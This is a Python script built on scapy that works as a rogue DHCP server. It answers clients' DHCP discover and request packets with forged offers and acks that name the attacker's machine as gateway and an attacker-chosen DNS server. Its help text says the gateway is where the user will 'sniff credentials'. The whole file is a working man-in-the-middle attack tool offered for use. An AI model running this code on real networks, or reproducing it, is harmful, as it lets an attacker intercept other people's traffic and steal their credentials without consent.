import argparse
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, getmacbyip


class DHCPListener:
    # Real router
    __GATEWAY_IP: str
    __GATEWAY_MAC: str

    # My DHCP server
    __DHCPServerIp: str
    __DHCPMac: str
    __dictIPS: dict
    __IPPool: list

    # DHCP configuration
    __fakeDNSServer: str
    __fakeSubnetMask: str
    __fakeGatewayIP: str
    __leaseTime: int

    def __init__(self):
        self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]
        self.__GATEWAY_MAC = getmacbyip(self.__GATEWAY_IP)

        self.__DHCPServerIp = get_if_addr(conf.iface)
        self.__DHCPMac = Ether().src
        self.__dictIPS = {}
        self.__IPPool = []

        self.__fakeDNSServer = "8.8.8.8"
        self.__fakeSubnetMask = ""
        self.__fakeGatewayIP = self.__DHCPServerIp
        self.__leaseTime = 86400

    def setDNS(self, dns):
        self.__fakeDNSServer = dns

    def setSubnetMask(self, subnetmask):
        self.__fakeSubnetMask = subnetmask

    def setGatewayIP(self, gateway):
        self.__fakeGatewayIP = gateway

    def setIPPool(self, IPPool):
        self.__IPPool = self.getIPPoolbyRange(IPPool)

    # Return a list of IP address given a range
    def getIPPoolbyRange(self, iprange):
        return self.returnRange(iprange)

    @staticmethod
    def getIpRangeIterator(iprange):
        l: list = iprange.split(".")
        l.remove(l[len(l) - 1])
        ip = ""
        for i in l:
            ip += str(i) + "."
        return ip

    # Remove last number of an IP address. Ex: For 192.168.0.100 return 192.168.0.
    def returnRange(self, iprange):
        listIP = iprange.split("-")
        maxIP = self.getIpRangeIterator(listIP[0])
        listIP[1] = maxIP + listIP[1]
        return self.generateList(listIP)

    def generateList(self, listIP):
        newList = []
        i = int(listIP[0].split(".")[3])
        n = int(listIP[1].split(".")[3])
        index = self.getIpRangeIterator(listIP[0])

        for x in range(i, n + 1):
            newList.append(index + str(x))
        return newList

    # Decode bytes in option to ascii
    @staticmethod
    def getOption(dhcp_options, key):
        must_decode = ['hostname', 'domain', 'vendor_class_id']
        try:
            for i in dhcp_options:
                if i[0] == key:
                    # If DHCP Server Returned multiple name servers
                    # return all as comma seperated string.
                    if key == 'name_server' and len(i) > 2:
                        return ",".join(i[1:])
                    # domain and hostname are binary strings,
                    # decode to unicode string before returning
                    elif key in must_decode:
                        return i[1].decode()
                    else:
                        return i[1]
        except:
            pass

    # return a DHCP packet for the client discovery or request. Type could be offer or ack
    def generatePacketServer(self, type, IPClient, packet):
        return (Ether(src=self.__DHCPMac, dst=packet[Ether].src) /
                IP(src=self.__DHCPServerIp, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2,
                      yiaddr=IPClient,
                      ciaddr=packet[IP].src,
                      siaddr=self.__DHCPServerIp,
                      chaddr=packet[Ether].chaddr,
                      xid=packet[BOOTP].xid) /
                DHCP(options=[
                    ('server_id', self.__DHCPServerIp),
                    ("lease_time", 86400),  # 1 day
                    ('subnet_mask', self.__fakeSubnetMask),
                    ('router', self.__fakeGatewayIP),
                    ('message-type', type),
                    ("name_server", self.__fakeDNSServer),
                    'end']
                ))

    # Listening to dhcp packet
    def listener(self, packet):
        # DHCP discover
        if DHCP in packet and packet[DHCP].options[0][1] == 1:
            # send DHCP offer
            if len(self.__IPPool) > 0:
                IPClient = self.__IPPool.pop()
                offer = self.generatePacketServer("offer", IPClient, packet)
                sendp(offer)

            print('---New DHCP Discover---')
            hostname = self.getOption(packet[DHCP].options, 'hostname')
            print(f"[*] Host {hostname} ({packet[Ether].src}) asked for an IP")

        # DHCP request
        if DHCP in packet and packet[DHCP].options[0][1] == 3:
            # send DHCP ack
            requestedIP = self.getOption(packet[DHCP].options, 'requested_addr')
            ack = self.generatePacketServer("ack", requestedIP, packet)
            sendp(ack)

            print('---New DHCP Request---')
            hostname = self.getOption(packet[DHCP].options, 'hostname')
            print(f"[*] Host {hostname} ({packet[Ether].src}) requested {requestedIP}")
            self.__dictIPS[requestedIP] = packet[Ether].src

        """else:
            print('---Other DHCP packet?---')
            print(packet.summary())
            print(ls(packet))
        """


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a DHCP rogue server.")
    parser.add_argument("-d", "--dns", required=False, help="DNS IP")
    parser.add_argument("-m", "--netmask", required=True)
    parser.add_argument("-g", "--gateway", required=False,
                        help="Gateway IP for your attack (the IP in which you are going to sniff credentials). "
                             "Default is the same IP"
                             " that your DHCP server")
    parser.add_argument("-x", "--iprange", required=False,
                        help="Range IP Ex: 192.168.0.1-45 ")
    args = parser.parse_args()

    DHCPListener = DHCPListener()
    if args.dns is not None:
        DHCPListener.setDNS(args.dns)
    if args.gateway is not None:
        DHCPListener.setGatewayIP(args.gateway)
    DHCPListener.setSubnetMask(args.netmask)
    if args.iprange is not None:
        DHCPListener.setIPPool(args.iprange)

    print("DHCP server in listening...")
    sniff(filter="udp and port 67", prn=DHCPListener.listener)
